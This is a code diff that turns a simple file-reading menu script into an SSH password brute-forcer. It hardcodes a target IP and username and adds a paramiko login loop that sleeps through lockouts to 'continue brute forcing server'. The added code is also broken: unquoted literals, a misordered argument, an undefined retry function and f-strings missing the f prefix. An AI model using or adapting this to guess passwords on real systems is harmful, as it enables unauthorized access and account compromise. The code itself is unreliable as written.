@@ -6,7 +6,11 @@
 #Expected output: List of strings in the file
 #variables: choice, path, file, lines, word, string, content
 
-import time
+import paramiko, time, socket
+
+global target, username, password
+target = 192.168.18.73
+username = chris
 
 def menu():
     print ("\nwhat would you like to do?\n")
@@ -76,10 +80,48 @@ def recognizer():
         #It is needed so the loop doesn't keep printing the response
             continue
     f.close()
-                           
+
+#Look for the right password with given exceptions                        
+def connection(target,username, password):
+   initialize = paramiko.SSHClient()
+   #Initialize ssh client
+   initialize.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+   #Add to know hosts 
+      
+   try:
+       initialize.connect(target, port=22, username, password=password)
+
+   except paramiko.AuthenticationException:
+   #Failed authentication by credentials    
+       print ("[!] Invalid credentials for {username}:{password}")
+       return False
+   
+   except socket.error:
+   #Connection failed because is unreachable or any connection error 
+       print("[!] Connection to IP:{host} couldn't be established")
+       return False
+   
+   except paramiko.SSHException:
+   #Server detected brute force attack so we stop.
+        print("[!] Too many attempts, retrying in 1 minute...")
+        time.sleep(60)
+        #Sleep for a minute
+        return retry(target, username, password)
+        #Continue brute forcing server
+   else:    
+       print("\n[*] Password cracked {password}")
+       return True
+
+#Main function                                     
 def main():
     for i in range (5):
     #Let the user use the menu up to 5 times at a time
         choice = menu()
         action(choice)
 main()
+
+# #Gives alternative message when manually stoping the script
+# except KeyboardInterrupt:
+#     print ([!]"\n\n[*] ^_^ Goodbye")
+#     sys.exit(3)
+#     #Code 3, specific message
